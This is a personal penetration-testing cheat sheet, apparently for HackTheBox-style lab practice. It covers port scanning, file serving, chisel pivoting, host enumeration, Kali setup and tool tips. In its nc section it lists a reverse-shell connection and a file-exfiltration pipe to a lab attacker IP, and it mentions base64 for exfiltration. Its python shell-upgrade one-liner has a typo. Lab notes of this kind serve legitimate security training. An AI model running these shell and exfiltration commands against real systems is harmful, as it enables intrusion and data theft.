# PT𓀮EH

```sh
# VM host:

# kali server:
10.10.14.69

# vuln boxes:
10.10.10.198
```

# toc

<!-- vim-markdown-toc GFM -->

  * [enumeration](#enumeration)
  * [foothold and pivot](#foothold-and-pivot)
    * [kali](#kali)
    * [linux](#linux)
    * [windows](#windows)
  * [priviledge escalation](#priviledge-escalation)
    * [linux](#linux-1)
    * [windows](#windows-1)
* [bonus](#bonus)
  * [oneliners](#oneliners)
  * [kali config](#kali-config)
  * [kali tips](#kali-tips)
  * [basics](#basics)
    * [windows](#windows-2)
    * [linux](#linux-2)
* [tools](#tools)
  * [less](#less)
  * [nc](#nc)
  * [ssh](#ssh)
  * [Burp Suite](#burp-suite)
  * [sqlmap](#sqlmap)
  * [thc-hydra](#thc-hydra)

<!-- vim-markdown-toc -->

## enumeration

<details><summary><input type=checkbox> port scanning</summary>

```sh
nmap -v $host | tee 00.nmap # fast initial scan.

```

</details>

## foothold and pivot

### kali

<details> <summary><input type=checkbox> serving files</summary>

```sh
# via webserver:
python3 -m http.server 80

# via samba:
impacket-smbserver -smb2server share .
```

</details>

<details><summary><input type=checkbox> reverse shells and port bindings</summary>

```sh
# netcat
rlwrap nc -lnvp 42424

# chisel
# start the client first:
chisel client -v 10.10.14.69 R:8888:127.0.0.1:8888
# local: 8888
# remote: 127.0.0.1:8888
chisel server -v -p 12345 --reverse
# connect with:

# plink
```

</details>


### linux

<details><summary><input type=checkbox> information gathering</summary>


```sh
id # user and groups.
ps -p $$
ip a # or ifconfig.
netstat -tulpen # connections.
lsblk # devices.
locate / # list of probably every file on the system.
# depending on under which user updatedb ran.
```

</details>

<details><summary><input type=checkbox> downloading files</summary>


```sh
# linux download:
wget $h/file
curl $h/file -so file
```

</details>

<details><summary><input type=checkbox> info gathering with external tools</summary>


```sh
./linpeas.sh -a
```

</details>

### windows

<details><summary><input type=checkbox> information gathering</summary>

```sh
dir /q
whoami /all
systeminfo
set
tasklist
ipconfig /all
netstat -nao | findstr 127 | findstr LISTEN

# services
powershell -c "Get-Service | Format-Table -AutoSize"
sc # stop/start service
net start # old (from DOS)
```

</details>

<details><summary><input type=checkbox> downloading files</summary>


```sh
# powershell:
iwr hostname/file.exe -outf file.exe
# long version:
Invoke-WebRequest hostname/file.exe -OutFile file.exe
```

</details>

<details><summary><input type=checkbox> info gathering with external tools</summary>


```sh
linpeas.exe
linpeas.bat # if exe fails.
```

</details>

## priviledge escalation

### linux

### windows

# bonus
## oneliners

```sh
# upgrade shell:
python -c 'import pyt;pty.spawn("bash")'

# fix environment:
export TERM=linux

# logging a reverse shell locally:
script # stop with ^D. breaks in vi. finicky.

# get a temp dir:
cd $(mktemp -d)

# get local connections:
netstat -tulpen
```

## kali config

```sh
# pip2 for new Kalis:
curl -s https://bootstrap.pypa.io/get-pip.py | python2
pip2 install requests colorama # for the exploit above.
pip2 install xlrd # for windows exploit suggester.
apt install ncdu

pip3 install cve_searchsploit # https://github.com/andreafioraldi/cve_searchsploit
# update it:
cve_searchsploit -u

cd /opt
git clone 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git'
cd Windows-Exploit-Suggester
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --help

# chisel
cd /opt
wget 'https://github.com/jpillora/chisel/releases/download/v1.7.1/chisel_1.7.1_windows_386.gz'
wget 'https://github.com/jpillora/chisel/releases/download/v1.7.1/chisel_1.7.1_linux_386.gz'
gunzip chisel*
mv chisel*windows* chisel.exe
```

```sh
# metasploit
sudo service postgresql start
sudo msfdb init
msfconsole # db_status
```

## kali tips

* ranger disables previews for root (enable them on a by case basis with `zp`)

## basics
### windows

```sh
# windows get cmd.exe help:
help

# powershell
cd $env:tmp

# cmd.exe
cd %tmp%
```

### linux

```sh
umask -S # file creation mask.
# help umask (linux)

sudo -l # list allowed and forbidden commands.

sudo -u kali whoami # run whoami as kali.

base64 # great for exfiltration without inet.
# then just copy the text from the terminal.
# -d to decode it again.
# use pipes or pass a filename.

strings -e # different encoding options.

find . # get list of all files in dir.
# great for lot's of files/folders with spaces
# where autocompletion is broken.

xdotool # fake keyboard mouse in X.
```

# tools

## less

> read raw control chars (colors).
```sh
./linpeas.sh | less -R
```

* less uses many vim bindings
* press `h` for help
* press `s` to save to a file
* `Gg` scrolls to the bottom and back up, now you can use `^g` to show progress!

## nc

> reverse shell
```sh
# attacker:
nc -lnvp 12345

# attackee:
nc 10.10.14.69 12345
```

> exfiltration by piping over the network
```sh
# attacker:
nc -lnvp 12345 > exfil_file

# attackee:
nc -q0 10.10.14.69 12345 < exfil_file
```

* commands this can be useful for: `dd`, `tar` (tar pipe)

> check for open port
```sh
nc -vvz localhost 443

# multiple
nc -vzz localhost 80 8080

# or a range
nc -vvz localhost 1-1024 2>&1 | grep -v refused
```

## ssh

> local port forwarding

```sh
ssh -N kali -L 0.0.0.0:8080:tabby:8080 -L 0.0.0.0:80:tabby:80
# binds tabby's 80 and 8080 to all interfaces on the executing server.
```

## Burp Suite

* [Burp Suite](burp)

## sqlmap

## thc-hydra
